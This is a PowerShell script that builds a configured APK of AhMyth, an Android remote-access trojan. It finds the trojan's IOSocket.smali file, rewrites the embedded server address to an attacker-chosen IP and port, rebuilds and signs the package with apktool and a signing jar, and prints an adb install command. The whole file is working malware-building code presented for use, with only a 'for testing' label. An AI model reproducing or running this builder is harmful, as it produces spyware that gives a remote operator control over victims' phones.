# Quick build script for testing
param(
    [string]$IP = "10.0.2.2",
    [int]$Port = 1234
)

$ErrorActionPreference = "Stop"

Write-Host "=== Quick AhMyth APK Builder ===" -ForegroundColor Cyan
Write-Host "IP: $IP" -ForegroundColor Yellow
Write-Host "Port: $Port" -ForegroundColor Yellow

# Check for IOSocket file
$ioSocketPaths = @(
    "Ahmyth\smali\ahmyth\mine\king\ahmyth\IOSocket.smali",
    "Ahmyth\smali_classes2\ahmyth\mine\king\ahmyth\IOSocket.smali",
    "Ahmyth\smali_classes3\ahmyth\mine\king\ahmyth\IOSocket.smali"
)

$ioSocketFile = $null
foreach ($path in $ioSocketPaths) {
    if (Test-Path $path) {
        $ioSocketFile = $path
        Write-Host "[OK] Found IOSocket at: $path" -ForegroundColor Green
        break
    }
}

if (-not $ioSocketFile) {
    Write-Host "[ERROR] IOSocket.smali not found!" -ForegroundColor Red
    exit 1
}

# Update IP and Port
Write-Host "[->] Updating server configuration..." -ForegroundColor Yellow
$content = Get-Content $ioSocketFile -Raw
$pattern = "http://[^`"]+:\d+"
$replacement = "http://$($IP):$Port"
$content = $content -replace $pattern, $replacement
Set-Content $ioSocketFile -Value $content -NoNewline
Write-Host "[OK] Configuration updated" -ForegroundColor Green

# Build APK
Write-Host "[->] Building APK..." -ForegroundColor Yellow
$timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
$outputApk = "Ahmyth-$timestamp.apk"
$buildCmd = "java -jar apktool.jar b Ahmyth -o $outputApk"
$result = cmd /c "$buildCmd 2>&1"
if ($LASTEXITCODE -ne 0) {
    Write-Host "[ERROR] Build failed!" -ForegroundColor Red
    Write-Host $result
    exit 1
}
Write-Host "[OK] APK built: $outputApk" -ForegroundColor Green

# Sign APK
Write-Host "[->] Signing APK..." -ForegroundColor Yellow
$signedApk = "Ahmyth-$timestamp-aligned-debugSigned.apk"
$signCmd = "java -jar sign.jar -a $outputApk"
$result = cmd /c "$signCmd 2>&1"
if ($LASTEXITCODE -ne 0) {
    Write-Host "[ERROR] Signing failed!" -ForegroundColor Red
    Write-Host $result
    exit 1
}

# The sign.jar creates the file automatically with -aligned-debugSigned suffix
if (Test-Path $signedApk) {
    Write-Host "[OK] APK signed: $signedApk" -ForegroundColor Green
    Write-Host ""
    Write-Host "Done! Install with:" -ForegroundColor Cyan
    Write-Host "  adb install -r $signedApk" -ForegroundColor White
} else {
    Write-Host "[ERROR] Signed APK not found!" -ForegroundColor Red
    exit 1
}
